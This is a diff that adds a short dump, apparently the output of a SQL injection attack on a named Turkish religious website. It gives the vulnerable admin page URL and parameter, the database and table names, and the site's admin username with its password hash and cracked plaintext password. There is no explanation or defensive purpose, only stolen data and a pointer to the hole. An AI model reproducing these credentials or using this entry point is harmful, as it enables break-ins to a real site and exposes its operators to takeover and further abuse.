@@ -1,0 +1,10 @@
+VULN URL : https://islamiyontem.net/admin/makaleduzenle.php?id=257 (NOREDIRECT VULN)
+
+Database: u9690708_islamiyontem_ne
+Table: kullanicilar
+[1 entry]
++----+-----------+------------------------------------------------+
+| id | kullanici | sifre                                          |
++----+-----------+------------------------------------------------+
+| 1  | admin     | d662a4461de96e938538fe38904cf9b8 (Ankara_1961) |
++----+-----------+------------------------------------------------+
